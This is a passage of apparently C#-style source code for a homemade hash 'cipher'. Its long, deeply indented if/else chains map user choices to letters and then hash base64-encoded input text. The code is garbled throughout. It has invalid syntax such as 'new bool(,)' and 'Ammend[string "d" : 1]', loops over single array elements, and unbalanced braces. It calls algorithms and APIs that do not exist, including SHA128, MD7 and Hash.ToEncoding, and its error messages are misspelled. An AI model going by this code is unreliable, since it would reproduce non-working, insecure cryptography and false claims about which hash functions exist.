																																																													else if(_boolIT(_inputDecision2, _int2) == true){

																																																														_disArray.Ammend[string "d" : 1];

																																																													}
																																																													else if(_boolIT(_inputDecision3 , _int2) == true){

																																																														_disArray.Ammend[string "d" : 2];

																																																													}
																																																													else if(_boolIT(_inputDecision4 , _int2) == true){

																																																														_disArray.Ammend[string "d" : 3];

																																																													}
																																																													else if(_boolIT(_inputDecision5 , _int2) == true){

																																																														_disArray.Ammend[string "d" : 4];
																																																													}
																																																													else if(_boolIT(_inputDecision6 , _int2) == true){

																																																														_disArray.Ammend[string "d" : 5];

																																																													}
																																																													else if(_boolIT(_inputDecision7 , _int2) == true){

																																																														_disArray.Ammend[string "d" : 6];

																																																													}
																																																													else if(_boolIT(_inputDecision8 , _int2) == true){

																																																														_disArray.Ammend[string "d" : 7];

																																																													}
																																																													else if(_boolIT(_inputDecision9 , _int2) == true){

																																																														_disArray.Ammend[string "d" : 8];

																																																													}
																																																													else{

																																																														System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																													}


																																																												}
																																																												else if(_inputDecision == _int3 || _inputDecision2 == _int3 || _inputDecision3 == _int3 || _inputDecision4 == _int3 || _inputDecision5 == _int3 || _inputDecision6 == _int3 || _inputDecision7 == _int3 || _inputDecision8 == _int3 ||
																																																													_inputDecision9 == _int3){

																																																													string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																													string _part1 = _disarrayEya[0];
																																																													public bool _boolIT = new bool(,);
																																																													if(_boolIT(_inputDecision  , _int3) == true){

																																																														_disArray.Ammend[string "e" : 0];


																																																													}
																																																													else if(_boolIT(_inputDecision2, _int3) == true){


																																																														_disArray.Ammend[string "e" : 1];

																																																													}
																																																													else if(_boolIT(_inputDecision3 , _int3) == true){

																																																														_disArray.Ammend[string "e" : 2];

																																																													}
																																																													else if(_boolIT(_inputDecision4 , _int3) == true){

																																																														_disArray.Ammend[string "e" : 3];

																																																													}
																																																													else if(_boolIT(_inputDecision5 , _int3) == true){

																																																														_disArray.Ammend[string "e" : 4];


																																																													}
																																																													else if(_boolIT(_inputDecision6 , _int3) == true){

																																																														_disArray.Ammend[string "e" : 5];


																																																													}
																																																													else if(_boolIT(_inputDecision7 , _int3) == true){

																																																														_disArray.Ammend[string "e" : 6];

																																																													}
																																																													else if(_boolIT(_inputDecision8 , _int3) == true){

																																																														_disArray.Ammend[string "e" : 7];

																																																													}
																																																													else if(_boolIT(_inputDecision9 , _int3) == true){

																																																														_disArray.Ammend[string "e" : 8];

																																																													}
																																																													else{

																																																														System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																													}

																																																												}
																																																												else if(_inputDecision == _int4 || _inputDecision2 == _int4 || _inputDecision3 == _int4 || _inputDecision4 == _int4 || _inputDecision5 == _int4 || _inputDecision6 == _int4 || _inputDecision7 == _int4 || _inputDecision8 == _int4 ||
																																																													_inputDecision9 == _int4){

																																																													string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];

																																																													string _part1 = _disarrayEya[0];
																																																													public bool _boolIT = new bool(,);
																																																													if(_boolIT(_inputDecision  , _int4) == true){

																																																														_disArray.Ammend[string "f" : 0];


																																																													}
																																																													else if(_boolIT(_inputDecision2, _int4) == true){


																																																														_disArray.Ammend[string "f" : 1];

																																																													}
																																																													else if(_boolIT(_inputDecision3 , _int4) == true){

																																																														_disArray.Ammend[string "f" : 2];


																																																													}
																																																													else if(_boolIT(_inputDecision4 , _int4) == true){

																																																														_disArray.Ammend[string "f" : 3];

																																																													}
																																																													else if(_boolIT(_inputDecision5 , _int4) == true){

																																																														_disArray.Ammend[string "f" : 4];

																																																													}
																																																													else if(_boolIT(_inputDecision6 , _int4) == true){

																																																														_disArray.Ammend[string "f" : 5];

																																																													}
																																																													else if(_boolIT(_inputDecision7 , _int4) == true){

																																																														_disArray.Ammend[string "f" : 6];
																																																													}
																																																													else if(_boolIT(_inputDecision8 , _int4) == true){

																																																														_disArray.Ammend[string "f" : 7];

																																																													}
																																																													else if(_boolIT(_inputDecision9 , _int4) == true){

																																																														_disArray.Ammend[string "f" : 8];

																																																													}
																																																													else{

																																																														System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																													}

																																																												}
																																																												else if(_inputDecision == _int5 || _inputDecision2 == _int5 || _inputDecision3 == _int5 || _inputDecision4 == _int5 || _inputDecision5 == _int5 || _inputDecision6 == _int5 || _inputDecision7 == _int5 || _inputDecision8 == _int5 ||
																																																													_inputDecision9 == _int5){


																																																													string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																													string _part1 = _disarrayEya[0];
																																																													public bool _boolIT = new bool(,);
																																																													if(_boolIT(_inputDecision  , _int5) == true){

																																																														_disArray.Ammend[string "G" : 0];

																																																													}
																																																													else if(_boolIT(_inputDecision2, _int5) == true){

																																																														_disArray.Ammend[string "G" : 1];

																																																													}
																																																													else if(_boolIT(_inputDecision3 , _int5) == true){

																																																														_disArray.Ammend[string "G" : 2];

																																																													}
																																																													else if(_boolIT(_inputDecision4 , _int5) == true){

																																																														_disArray.Ammend[string "G" : 3];

																																																													}
																																																													else if(_boolIT(_inputDecision5 , _int5) == true){

																																																														_disArray.Ammend[string "G" : 4];

																																																													}
																																																													else if(_boolIT(_inputDecision6 , _int5) == true){

																																																														_disArray.Ammend[string "G" : 5];

																																																													}
																																																													else if(_boolIT(_inputDecision7 , _int5) == true){

																																																														_disArray.Ammend[string "G" : 6];

																																																													}
																																																													else if(_boolIT(_inputDecision8 , _int5) == true){

																																																														_disArray.Ammend[string "G" : 7];

																																																													}
																																																													else if(_boolIT(_inputDecision9 , _int5) == true){

																																																														_disArray.Ammend[string "G" : 8];

																																																													}
																																																													else{

																																																														System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																													}

																																																												}
																																																												else if(_inputDecision == _int6 || _inputDecision2 == _int6 || _inputDecision3 == _int6 || _inputDecision4 == _int6 || _inputDecision5 == _int6 || _inputDecision6 == _int6 || _inputDecision7 == _int6 || _inputDecision8 == _int6 ||
																																																													_inputDecision9 == _int6){


																																																													string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																													string _part1 = _disarrayEya[0];
																																																													public bool _boolIT = new bool(,);
																																																													if(_boolIT(_inputDecision  , _int6) == true){

																																																														_disArray.Ammend[string "z" : 0];


																																																													}
																																																													else if(_boolIT(_inputDecision2, _int6) == true){

																																																														_disArray.Ammend[string "z" : 1];


																																																													}
																																																													else if(_boolIT(_inputDecision3 , _int6) == true){

																																																														_disArray.Ammend[string "z" : 2];


																																																													}
																																																													else if(_boolIT(_inputDecision4 , _int6) == true){


																																																														_disArray.Ammend[string "z" : 3];



																																																													}
																																																													else if(_boolIT(_inputDecision5 , _int6) == true){



																																																														_disArray.Ammend[string "z" : 4];


																																																													}
																																																													else if(_boolIT(_inputDecision6 , _int6) == true){

																																																														_disArray.Ammend[string "z" : 5];


																																																													}
																																																													else if(_boolIT(_inputDecision7 , _int6) == true){

																																																														_disArray.Ammend[string "z" : 6];

																																																													}
																																																													else if(_boolIT(_inputDecision8 , _int6) == true){

																																																														_disArray.Ammend[string "z" : 7];

																																																													}
																																																													else if(_boolIT(_inputDecision9 , _int6) == true){

																																																														_disArray.Ammend[string "z" : 8];

																																																													}
																																																													else{
																																																														System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");

																																																														}

																																																												}
																																																												else{
																																																													System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																												}


																																																												System.Console.WriteLine("Plvse Input The Text You Wish To Hvve Encoded In Your 6-3 Dimensionvl Vlgorithmic Hvsh Cipher: ");
																																																												string _CipherPreText = System.Console.ReadLine();

																																																												for(_codexstring[0]){

																																																													if(_codexstring[0] == "c"){
																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																														_encoCiphHash(_cipherByteBase){

																																																															public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																															public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																															return _shvfunc;

																																																														}

																																																													}

																																																													else if(_codexstring[0] == "d"){
																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																														_encoCiphHash(_cipherByteBase){

																																																															public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																															public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																															return _shvfunc;

																																																														}
																																																														else if(_codexstring[0] == "e"){
																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																															_encoCiphHash(_cipherByteBase){

																																																																public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																return _shvfunc;

																																																															}
																																																															else if(_codexstring[0] == "f"){
																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																_encoCiphHash(_cipherByteBase){

																																																																	public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																	public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																	return _shvfunc;

																																																																}
																																																																else if(_codexstring[0] == "G"){
																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																	_encoCiphHash(_cipherByteBase){

																																																																		public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																		public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																		return _shvfunc;

																																																																	}
																																																																	else if(_codexstring[0] == "z"){
																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																		_encoCiphHash(_cipherByteBase){

																																																																			public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																			public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																			return _shvfunc;

																																																																		}
																																																																		else{
																																																																			System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																		}



																																																																	}
																																																																	for(_codexstring[1]){

																																																																		if(_codexstring[1] == "c"){
																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																			_encoCiphHash(_cipherByteBase){

																																																																				public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																				public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																				return _shvfunc;

																																																																			}

																																																																		}

																																																																		else if(_codexstring[1] == "d"){
																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																			_encoCiphHash(_cipherByteBase){

																																																																				public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																				public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																				return _shvfunc;

																																																																			}
																																																																			else if(_codexstring[1] == "e"){
																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																				_encoCiphHash(_cipherByteBase){

																																																																					public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																					public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																					return _shvfunc;

																																																																				}
																																																																				else if(_codexstring[1] == "f"){
																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																					_encoCiphHash(_cipherByteBase){

																																																																						public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																						public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																						return _shvfunc;

																																																																					}
																																																																					else if(_codexstring[1] == "G"){
																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																						_encoCiphHash(_cipherByteBase){

																																																																							public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																							public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																							return _shvfunc;

																																																																						}
																																																																						else if(_codexstring[1] == "z"){
																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																							_encoCiphHash(_cipherByteBase){

																																																																								public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																								public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																								return _shvfunc;

																																																																							}
																																																																							else{
																																																																								System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																							}



																																																																						}
																																																																						for(_codexstring[2]){

																																																																							if(_codexstring[2] == "c"){
																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																								_encoCiphHash(_cipherByteBase){

																																																																									public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																									public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																									return _shvfunc;

																																																																								}

																																																																							}

																																																																							else if(_codexstring[2] == "d"){
																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																								_encoCiphHash(_cipherByteBase){

																																																																									public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																									public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																									return _shvfunc;

																																																																								}
																																																																								else if(_codexstring[2] == "e"){
																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																									_encoCiphHash(_cipherByteBase){

																																																																										public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																										public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																										return _shvfunc;

																																																																									}
																																																																									else if(_codexstring[2] == "f"){
																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																										_encoCiphHash(_cipherByteBase){

																																																																											public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																											public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																											return _shvfunc;

																																																																										}
																																																																										else if(_codexstring[2] == "G"){
																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																											_encoCiphHash(_cipherByteBase){

																																																																												public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																												public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																												return _shvfunc;

																																																																											}
																																																																											else if(_codexstring[2] == "z"){
																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																												_encoCiphHash(_cipherByteBase){

																																																																													public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																													public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																													return _shvfunc;

																																																																												}
																																																																												else{
																																																																													System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																												}
																																																																											}
																																																																											for(_codexstring[3]){

																																																																												if(_codexstring[3] == "c"){
																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																													_encoCiphHash(_cipherByteBase){

																																																																														public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																														public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																														return _shvfunc;

																																																																													}

																																																																												}

																																																																												else if(_codexstring[3] == "d"){
																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																													_encoCiphHash(_cipherByteBase){

																																																																														public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																														public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																														return _shvfunc;

																																																																													}
																																																																													else if(_codexstring[3] == "e"){
																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																														_encoCiphHash(_cipherByteBase){

																																																																															public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																															public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																															return _shvfunc;

																																																																														}
																																																																														else if(_codexstring[3] == "f"){
																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																															_encoCiphHash(_cipherByteBase){

																																																																																public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																return _shvfunc;

																																																																															}
																																																																															else if(_codexstring[3] == "G"){
																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																_encoCiphHash(_cipherByteBase){

																																																																																	public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																	public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																	return _shvfunc;

																																																																																}
																																																																																else if(_codexstring[3] == "z"){
																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																		public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																		public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																		return _shvfunc;

																																																																																	}
																																																																																	else{
																																																																																		System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																	}

																																																																																}
																																																																																for(_codexstring[4]){

																																																																																	if(_codexstring[4] == "c"){
																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																			public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																			public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																			return _shvfunc;

																																																																																		}

																																																																																	}

																																																																																	else if(_codexstring[4] == "d"){
																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																			public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																			public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																			return _shvfunc;

																																																																																		}
																																																																																		else if(_codexstring[4] == "e"){
																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																				public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																				public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																				return _shvfunc;

																																																																																			}
																																																																																			else if(_codexstring[4] == "f"){
																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																					public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																					public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																					return _shvfunc;

																																																																																				}
																																																																																				else if(_codexstring[4] == "G"){
																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																						public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																						public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																						return _shvfunc;

																																																																																					}
																																																																																					else if(_codexstring[4] == "z"){
																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																							public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																							public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																							return _shvfunc;

																																																																																						}
																																																																																						else{
																																																																																							System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																						}

																																																																																					}
																																																																																					for(_codexstring[5]){

																																																																																						if(_codexstring[5] == "c"){
																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																								public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																								public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																								return _shvfunc;

																																																																																							}

																																																																																						}

																																																																																						else if(_codexstring[5] == "d"){
																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																								public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																								public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																								return _shvfunc;

																																																																																							}
																																																																																							else if(_codexstring[5] == "e"){
																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																									public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																									public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																									return _shvfunc;

																																																																																								}
																																																																																								else if(_codexstring[5] == "f"){
																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																										public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																										public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																										return _shvfunc;

																																																																																									}
																																																																																									else if(_codexstring[5] == "G"){
																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																											public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																											public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																											return _shvfunc;

																																																																																										}
																																																																																										else if(_codexstring[5] == "z"){
																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																												public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																												public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																												return _shvfunc;

																																																																																											}
																																																																																											else{
																																																																																												System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																											}
																																																																																										}
																																																																																										for(_codexstring[6]){

																																																																																											if(_codexstring[6] == "c"){
																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																												public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																													public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																													public SHA128 _shvfunc2 = _hashsec128.ToEncoding(SHA128);
																																																																																													return _shvfunc2;

																																																																																												}

																																																																																											}

																																																																																											else if(_codexstring[6] == "d"){
																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																												public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																													public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																													public SHA256 _shvfunc2 = _hashsec256.ToEncoding(SHA256);
																																																																																													return _shvfunc2;

																																																																																												}
																																																																																												else if(_codexstring[6] == "e"){
																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																													public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																														public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																														public SHA512 _shvfunc2 = _hashsec512.ToEncoding(SHA512);
																																																																																														return _shvfunc2;

																																																																																													}
																																																																																													else if(_codexstring[6] == "f"){
																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																														public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																															public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																															public MD5 _shvfunc2 = _hashsecMD5.ToEncoding(MD5);
